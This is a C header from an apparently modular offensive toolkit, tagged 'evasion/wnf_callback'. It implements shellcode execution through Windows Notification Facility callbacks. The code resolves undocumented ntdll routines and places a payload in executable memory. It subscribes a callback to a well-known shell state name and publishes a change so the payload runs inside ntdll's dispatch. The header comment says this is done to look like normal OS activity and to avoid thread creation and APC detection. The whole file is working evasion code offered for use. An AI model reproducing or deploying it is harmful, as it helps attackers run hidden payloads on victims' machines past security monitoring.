// chunk: evasion/wnf_callback
// depends: (none)
// provides: setup_wnf_inject
// headers: windows.h
// risk: medium
// note: Windows Notification Facility (WNF) callback injection — subscribes to
//       a WNF state name with a callback that executes our payload. WNF is a
//       kernel-backed publish/subscribe mechanism used extensively by Windows
//       internals. Subscribing to a well-known state name (e.g.,
//       WNF_SHEL_APPLICATION_STARTED) and publishing a change triggers our
//       callback from within ntdll's WNF dispatch, appearing as normal OS
//       notification processing. No thread creation, no APC injection.

#ifndef CHUNK_WNF_CALLBACK
#define CHUNK_WNF_CALLBACK

#include <windows.h>

/* WNF state name — 8-byte opaque value */
typedef struct _WNF_STATE_NAME {
    ULONG Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME;

typedef struct _WNF_CHANGE_STAMP {
    ULONG Value;
} WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;

/* Well-known WNF state names (reversed from ntoskrnl) */
/* WNF_SHEL_APPLICATION_STARTED: fires when shell apps start */
static const WNF_STATE_NAME WNF_SHEL_APPLICATION_STARTED = { { 0xd83063ea, 0xa3bc0875 } };
/* WNF_SHEL_LOGON_COMPLETE: fires at logon */
static const WNF_STATE_NAME WNF_SHEL_LOGON_COMPLETE = { { 0xd83063ea, 0xa3bc1075 } };

typedef NTSTATUS (NTAPI *pfnRtlSubscribeWnfStateChangeNotification)(
    PVOID *SubscriptionHandle,
    WNF_STATE_NAME StateName,
    WNF_CHANGE_STAMP ChangeStamp,
    PVOID Callback,
    PVOID Context,
    PVOID TypeId,
    ULONG SerializationGroup,
    ULONG Unknown);

typedef NTSTATUS (NTAPI *pfnRtlPublishWnfStateChange)(
    WNF_STATE_NAME StateName,
    PVOID TypeId,
    PVOID Buffer,
    ULONG Length);

typedef NTSTATUS (NTAPI *pfnRtlUnsubscribeWnfStateChangeNotification)(
    PVOID SubscriptionHandle);

typedef struct _WNF_CB_CTX {
    BYTE          *payload;
    DWORD          payload_size;
    PVOID          exec_mem;
    PVOID          subscription;
    volatile LONG  fired;
} WNF_CB_CTX;

static WNF_CB_CTX _wnf_ctx = {0};
static pfnRtlUnsubscribeWnfStateChangeNotification _pRtlUnsub = NULL;

/*
 * WNF state change callback — invoked by ntdll when the subscribed state changes.
 *
 * Parameters match the WNF callback signature:
 *   StateName, ChangeStamp, TypeId, Context, Buffer, BufferSize
 */
static NTSTATUS NTAPI _wnf_state_callback(
    WNF_STATE_NAME StateName,
    WNF_CHANGE_STAMP ChangeStamp,
    PVOID TypeId,
    PVOID Context,
    PVOID Buffer,
    ULONG BufferSize)
{
    (void)StateName; (void)ChangeStamp; (void)TypeId;
    (void)Buffer; (void)BufferSize;

    WNF_CB_CTX *ctx = (WNF_CB_CTX *)Context;
    if (!ctx) return 0;

    /* One-shot */
    if (InterlockedCompareExchange(&ctx->fired, 1, 0) != 0)
        return 0;

    if (ctx->exec_mem) {
        ((void (*)(void))ctx->exec_mem)();
    }

    /* Unsubscribe to clean up */
    if (_pRtlUnsub && ctx->subscription) {
        _pRtlUnsub(ctx->subscription);
        ctx->subscription = NULL;
    }

    return 0;
}

/*
 * setup_wnf_inject: Subscribe to a WNF state name with a callback that
 * executes the payload, then trigger the state change.
 *
 * payload:      shellcode / position-independent code
 * payload_size: size in bytes
 *
 * Returns 1 on success, 0 on failure.
 */
static int setup_wnf_inject(BYTE *payload, DWORD payload_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnRtlSubscribeWnfStateChangeNotification pRtlSubscribe =
        (pfnRtlSubscribeWnfStateChangeNotification)GetProcAddress(
            ntdll, "RtlSubscribeWnfStateChangeNotification");
    pfnRtlPublishWnfStateChange pRtlPublish =
        (pfnRtlPublishWnfStateChange)GetProcAddress(
            ntdll, "RtlPublishWnfStateChange");
    _pRtlUnsub =
        (pfnRtlUnsubscribeWnfStateChangeNotification)GetProcAddress(
            ntdll, "RtlUnsubscribeWnfStateChangeNotification");

    if (!pRtlSubscribe) return 0;

    /* Allocate executable memory for payload */
    PVOID exec_mem = VirtualAlloc(NULL, payload_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_READWRITE);
    if (!exec_mem) return 0;

    memcpy(exec_mem, payload, payload_size);

    DWORD old_prot;
    VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &old_prot);

    _wnf_ctx.payload = payload;
    _wnf_ctx.payload_size = payload_size;
    _wnf_ctx.exec_mem = exec_mem;
    _wnf_ctx.subscription = NULL;
    _wnf_ctx.fired = 0;

    /* Subscribe to WNF state changes */
    WNF_CHANGE_STAMP stamp = {0};
    NTSTATUS status = pRtlSubscribe(
        &_wnf_ctx.subscription,
        WNF_SHEL_APPLICATION_STARTED,
        stamp,
        (PVOID)_wnf_state_callback,
        &_wnf_ctx,
        NULL,   /* TypeId */
        0,      /* SerializationGroup */
        0);     /* Unknown */

    if (status != 0) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        _wnf_ctx.exec_mem = NULL;
        return 0;
    }

    /* Trigger the callback by publishing a state change */
    if (pRtlPublish) {
        BYTE trigger_data[] = { 0x01 };
        pRtlPublish(WNF_SHEL_APPLICATION_STARTED, NULL, trigger_data, sizeof(trigger_data));
    }

    /* If publish isn't available or didn't trigger, callback fires on natural state change */
    return 1;
}

#endif
